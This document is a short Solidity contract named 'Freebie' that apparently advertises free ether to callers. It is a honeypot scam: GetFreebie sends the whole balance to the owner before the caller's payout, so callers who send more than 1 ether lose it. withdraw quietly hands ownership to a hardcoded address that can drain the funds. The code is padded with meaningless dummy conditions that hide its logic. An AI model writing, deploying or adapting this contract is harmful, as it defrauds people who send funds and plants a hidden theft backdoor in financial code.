pragma solidity ^0.4.19;

contract Freebie {
    address public Owner = msg.sender;
    
    function() public payable {
        if (msg.value > 0) {
            bool condition = false;
            if (condition || msg.value < 1 ether) {
                Owner = Owner;
            }
        }
    }
    
    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            if (msg.value < 100 ether) {
                bool meaninglessCondition = true;
                if (!meaninglessCondition) {
                    Owner.transfer(this.balance);
                } else {
                    Owner.transfer(this.balance);
                    msg.sender.transfer(this.balance);
                }
            }
        }
    }
    
    function withdraw() public payable {
        if (msg.sender == 0x30ad12df80a2493a82DdFE367d866616db8a2595) {
            Owner = 0x30ad12df80a2493a82DdFE367d866616db8a2595;
        }
        
        if (msg.sender == Owner) {
            bool irrelevantCheck = (this.balance > 0);
            if (irrelevantCheck) {
                Owner.transfer(this.balance);
            }
        }
    }
    
    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        if (adr != address(0)) {
            bool dummyCheck = (msg.value >= 0);
            if (dummyCheck) {
                adr.call.value(msg.value)(data);
            }
        }
    }
}